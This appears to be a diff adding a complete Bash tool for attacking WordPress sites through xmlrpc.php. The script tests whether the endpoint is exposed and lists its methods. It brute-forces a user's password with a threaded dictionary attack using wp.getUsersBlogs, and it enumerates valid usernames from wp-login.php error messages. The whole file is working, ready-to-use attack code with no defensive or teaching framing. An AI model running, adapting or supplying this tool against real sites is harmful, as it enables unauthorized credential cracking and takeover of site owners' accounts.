@@ -1,0 +1,413 @@
+#!/bin/bash
+
+#Colours
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+threads="off"
+function ctrl_c(){
+  if [ $threads == "on" ]; then
+    break &>/dev/null
+    pkill -P $$
+    clear
+  fi
+  echo -e "\n${redColour}[!] Quitting...\n\n"
+  rm /tmp/file2*.xml &>/dev/null
+  rm /tmp/status*.xml &>/dev/null
+  tput cnorm
+  exit 1
+}
+
+function exit0(){
+  echo -e "\n${redColour}[!] Quitting...\n\n"
+  rm /tmp/file2*.xml &>/dev/null
+  rm /tmp/status.* &>/dev/null
+  tput cnorm
+  exit 0
+}
+
+function logo(){
+  echo -e "${yellowColour}\t                _                 "
+  echo -e "\t__  ___ __ ___ | |_ __ _ __   ___ "
+  echo -e "\t\ \/ / '_ \` _ \| | '__| '_ \\ / __|"
+  echo -e "\t >  <| | | | | | | |  | |_) | (__ "
+  echo -e "\t/_/\_\_| |_| |_|_|_|  |_|__/ \___|"
+  echo -e "\t                      |_|         "
+
+}
+
+function helPanel(){
+  logo
+
+  echo -e "\n${yellowColour}Parameters: "
+  echo -e "\t ${purpleColour}t)${endColour} Specify URL or IP Address where wordpress is located"
+  echo -e "\t ${purpleColour}p)${endColour} Specify PORT"
+  echo -e "\t ${purpleColour}d)${endColour} Specify complete dictionary path"
+  echo -e "\t ${purpleColour}u)${endColour} Specify an user"
+  echo -e "\t ${purpleColour}c)${endColour} Check xmlrpc.php status"
+  echo -e "\t ${purpleColour}e)${endColour} User enumerator\n"
+  echo -e "${yellowColour}Interactive Mode: "
+  echo -e "\t ${purpleColour}i)${endColour} Start Interactive Mode"
+  ctrl_c
+}
+
+function checker(){
+  timeout 5 curl --insecure -s -X POST $final_url/xmlrpc.php | grep "<methodResponse>" &>/dev/null
+  if [ $? -eq 0 ]; then
+    echo -e "${yellowColour}\n[+] XMLRPC is visible\n"
+    echo -e "<?xml version="1.0" encoding="utf-8"?>\n<methodCall>\n<methodName>system.listMethods</methodName>\n<params></params>\n</methodCall>" > file.xml
+    curl -s -X POST $final_url/xmlrpc.php -d@file.xml | grep "wp.getUsersBlogs" &>/dev/null
+    if [ $? -eq 0 ]; then
+      echo -e "${yellowColour}[+] getUsersBlogs function detected\n\n${blueColour}[+] Looks like it could work${endColour}\n\n"
+    else
+      echo -e "$redColour[!] getUsersBlogs function not detected\n${endColour}"
+    fi
+  else
+    echo -e "${redColour}\n[!] XMLRPC is not visible\n"
+    ctrl_c
+  fi
+  rm -r file.xml
+}
+
+contenido_diccionario=""
+
+#Ctrl_C
+trap ctrl_c INT
+
+
+function url_checker(){ 
+
+  protocol=$(echo $url | grep -Po '.*(?=://)' || echo "")
+  domain_and_path=$(echo $url | grep -Po '(?<=://).*' || echo $url)
+  domain=$(echo $domain_and_path | grep -Po '^[^/]+')
+  path=$(echo $domain_and_path | grep -Po '(?<=/).*')
+
+
+  if [[ -z "$protocol" ]]; then
+    if [[ -z "$path" ]]; then
+      final_url="$domain$final_port"
+    else
+      final_url="$domain$final_port/$path"
+    fi
+  else
+    if [[ -z "$path" ]]; then
+      final_url="$protocol://$domain$final_port"
+    else
+      final_url="$protocol://$domain$final_port/$path"
+    fi
+  fi
+
+
+  timeout 5 curl --head -s --fail $final_url &>/dev/null
+  if [ ! $? -eq 0 ]; then
+    echo -e "\n${redColour}[!] Invalid URL. No connectivity to the URL.\n"
+    ctrl_c
+  else
+    url_checker_n=1
+  fi
+
+}
+
+function port_checker(){
+  if [ $port ] && [ $port -ne 80 ] ; then
+    if [[ $port -gt 1 ]] && [[ $port -lt 65535 ]]; then
+      final_port=":$port"
+      port_checker_n=1
+    else
+      echo -e "\n${redColour}[!] Invalid PORT\n"
+      ctrl_c
+    fi
+  elif [ ! $port ]; then
+    port_checker_n=1
+  fi
+
+
+}
+
+function dictionary_checker(){
+  if [ $dictionary ]; then
+    wc -l $dictionary &>/dev/null && dictionary_checker_n=1 
+    if [ $? -ne 0 ]; then 
+      echo -e "\n${redColour}[!] Dictionary path not found${endColour}\n"
+      ctrl_c
+    fi
+  else
+    echo -e "${redColour}[!] Dictionary not specificated\n${endColour}"
+    helPanel
+    ctrl_c
+  fi
+
+}
+
+
+function start(){
+
+  password="notfound"
+  threads="on"
+  temp_status=$(mktemp /tmp/status.XXXXXXXXXX)
+  echo -e "\n${blueColour}Running...${endColour}\n"
+  while read linea; do
+    temp_file=$(mktemp /tmp/file2.XXXXXXXXXX.xml)
+    if grep -q "found" $temp_status; then
+      password="found"
+      break
+    fi
+    {
+      echo -e "<methodCall>\n<methodName>wp.getUsersBlogs</methodName>\n<params>\n<param><value>$users</value></param>\n<param><value>$linea</value></param>\n</params>\n</methodCall>" > "$temp_file"
+      curl -s -X POST $final_url/xmlrpc.php -d@"$temp_file" | grep "<value><int>403</int></value>" &>/dev/null  
+      if [ ! $? -eq 0 ]; then
+        if [ $linea ]; then 
+          echo -e "${yellowColour}\nThe password is:${blueColour} $linea${endColour}\n"
+          echo "found" > $temp_status
+          pkill -P $$
+        fi
+      fi 
+      rm $temp_file
+      
+
+    } &
+  done < $dictionary
+  wait
+  if grep -q "found" $temp_status; then
+    exit0
+  else
+    echo -e "${redColour}\n[!] Password not found for user ${yellowColour}$users${endColour}\n"
+    exit0
+  fi
+  tput cnorm
+}
+
+function userEnumeration(){
+  userfound="notfound"
+  dictionary_checker
+  threads="on"
+  temp_status=$(mktemp /tmp/status.XXXXXXXXXX)
+  echo -e "\n${blueColour}Running...${endColour}\n"
+  full_url="$final_url/wp-login.php"
+  tput civis
+  while read linea; do
+    if grep -q "found" $temp_status; then
+      userfound="found"
+      break
+    fi
+    {
+    (curl -d "log=$linea&pwd=123" "$full_url" | grep -E 'la contraseña que has introducido para el nombre de usuario|The password you entered for the username'
+) &>/dev/null
+    if [ $? -eq 0 ]; then
+      echo -e "\n${greenColour}[+]${endColour} The user ${yellowColour}$linea${endColour} exists.\n"
+      userfound=found
+      echo "found" > $temp_status
+    fi
+    } &
+    
+  done < $dictionary
+  wait
+  if grep -q "found" $temp_status; then
+    exit0
+  else
+    echo -e "${redColour}\n[!] Password not found for user ${yellowColour}$users${endColour}\n"
+    exit0
+  fi
+
+  tput cnorm
+
+}
+
+function line(){
+   echo -e "\t---------------------------------"
+
+}
+
+function mode_e(){
+  clear
+  logo 
+  line
+  echo -e "\nValues:${endColour}"
+  echo -e "\t     ${blueColour}PORT:\t$port"
+  echo -e "\t${blueColour}URL or IP:\t$final_url"
+  echo -e "${blueColour}  Dictionary Path:\t$dictionary\n"
+}
+
+function mode_p(){
+  clear 
+  logo
+  line
+  echo -e "\nValues:${endColour}"
+  echo -e "\t     ${blueColour}PORT:\t$port"
+  echo -e "\t${blueColour}URL or IP:\t$final_url"
+  echo -e "${blueColour}  Dictionary Path:\t$dictionary"
+  echo -e "${blueColour}  \t     User:\t$users\n"
+
+}
+
+function mode_c(){
+  clear
+  logo
+  line
+  echo -e "\nValues:${endColour}"
+  echo -e "\t     ${blueColour}PORT:\t$port"
+  echo -e "\t${blueColour}URL or IP:\t$final_url\n"
+
+}
+
+function interactiveMode(){
+  clear
+  logo
+  line
+  echo -e "\nSelect mode:${endColour}"
+  echo -e "\t ${purpleColour}e)${endColour} User Enumerator"
+  echo -e "\t ${purpleColour}p)${endColour} Password Cracking of a known user"
+  echo -e "\t ${purpleColour}c)${endColour} Check if XMLRPC.php is visible\n"
+  echo -ne "${yellowColour}Select the mode you want to use -> ${purpleColour}" && read selected_mode
+  if [ $selected_mode != "e" ] && [ $selected_mode != "p" ] && [ $selected_mode != "c" ]; then
+    clear
+    logo
+    line
+    echo -e "\n${redColour}[!] Invalid mode${endColour}"
+    ctrl_c
+  elif [ $selected_mode == "e" ]; then
+    while [ -z $url ] || [ -z $dictionary ]; do
+      mode_e
+      if [ -z $port ]; then
+        echo -ne "${yellowColour}Provides PORT (enter to default 80) -> " && read port
+        if [[ $port =~ ^[0-9]+$ ]] || [ -z $port ]; then
+          port_checker
+          if [ -z $port ]; then
+            port=80
+          fi
+        else
+          echo -e "\n${redColour}[!] Invalid PORT\n"
+          ctrl_c
+        fi
+      elif [ -z $url ]; then
+        echo -ne "${yellowColour}Provides URL or IP -> " && read url
+        url_checker
+      elif [ -z $dictionary ]; then
+        echo -ne "${yellowColour}Provides full dictionary path -> " && read dictionary
+        dictionary_checker
+      fi
+      mode_e
+    done
+    userEnumeration
+  elif [ $selected_mode == "p" ]; then
+    while [ -z $url ] || [ -z $dictionary ] || [ -z $users ]; do 
+      mode_p
+      if [ -z $port ]; then
+        echo -ne "${yellowColour}Provides PORT (enter to default 80) -> " && read port
+        if [[ $port =~ ^[0-9]+$ ]] || [ -z $port ]; then
+          port_checker
+          if [ -z $port ]; then
+            port=80
+          fi
+        else
+          echo -e "\n${redColour}[!] Invalid PORT\n"
+          ctrl_c
+        fi
+      elif [ -z $url ]; then
+        echo -ne "${yellowColour}Provides URL or IP -> " && read url
+        url_checker
+      elif [ -z $dictionary ]; then
+        echo -ne "${yellowColour}Provides full dictionary path -> " && read dictionary
+        dictionary_checker
+      elif [ -z $users ]; then 
+        echo -ne "${yellowColour}Provides an User -> " && read users 
+      fi
+      mode_p
+    done 
+    start
+  elif [ $selected_mode == "c" ]; then
+    while [ -z $url ]; do 
+      mode_c
+      if [ -z $port ]; then
+        echo -ne "${yellowColour}Provides PORT (enter to default 80) -> " && read port
+        if [[ $port =~ ^[0-9]+$ ]] || [ -z $port ]; then
+          port_checker
+          if [ -z $port ]; then
+            port=80
+          fi
+        else
+          echo -e "\n${redColour}[!] Invalid PORT\n"
+          ctrl_c
+        fi
+      elif [ -z $url ]; then
+        echo -ne "${yellowColour}Provides URL or IP -> " && read url
+        url_checker
+      fi 
+      mode_c
+    done 
+    checker
+  fi
+}
+
+declare -i counter=0
+declare -i user=0
+declare -i url_ok=0 
+declare -i port_ok=0
+declare -i dictionary_ok=0
+declare -i checker_ok=0
+declare -i userEnumerator_ok=0
+declare -i interactiveMode_ok=0
+declare -i providedUser_ok=0
+
+while getopts "t:p:d:ceu:i" arg; do 
+  case $arg in 
+    t) url=$OPTARG; url_ok=1 ;;
+    p) port=$OPTARG; port_ok=1 ;;
+    d) dictionary=$OPTARG; dictionary_ok=1 ;;
+    c) let checker_ok=1 ;;
+    e) let userEnumerator_ok=1 ;;
+    u) users=$OPTARG && providedUser_ok=1 ;;
+    i) let interactiveMode_ok=1 ;;
+  esac
+done
+
+
+
+if [ $users ]; then
+  usuario_ok=1 
+else
+  usuario_ok=0
+fi
+
+
+if [ $url_ok -eq 1 ] && [ $checker_ok -eq 1 ] ; then
+  url_checker_n=0 
+  port_checker_n=0 
+  port_checker
+  url_checker
+  if [[ $url_checker_n -eq 1 ]] && [[ $port_checker_n -eq 1 ]]; then
+    checker
+  fi
+elif [[ $url_ok -eq 1 ]] && [[ $dictionary_ok -eq 1 ]] && [[ $providedUser_ok -eq 1 ]] ; then 
+  url_checker_n=0 
+  port_checker_n=0 
+  dictionary_checker_n=0
+  port_checker
+  url_checker
+  dictionary_checker
+  if [[ $url_checker_n -eq 1 ]] && [[ $port_checker_n -eq 1 ]] && [[ $dictionary_checker_n -eq 1 ]]; then
+    start
+  fi
+elif [[ $url_ok -eq 1 ]] && [[ $dictionary_ok -eq 1 ]] && [[ $userEnumerator_ok -eq 1 ]]; then
+  url_checker_n=0 
+  port_checker_n=0 
+  dictionary_checker_n=0 
+  port_checker
+  url_checker
+  dictionary_checker
+  if [[ $url_checker_n -eq 1 ]] && [[ $port_checker_n -eq 1 ]] && [[ $dictionary_checker_n -eq 1 ]]; then
+    userEnumeration
+  fi
+elif [ $interactiveMode_ok -eq 1 ]; then
+  interactiveMode
+else
+  helPanel
+fi
+
+
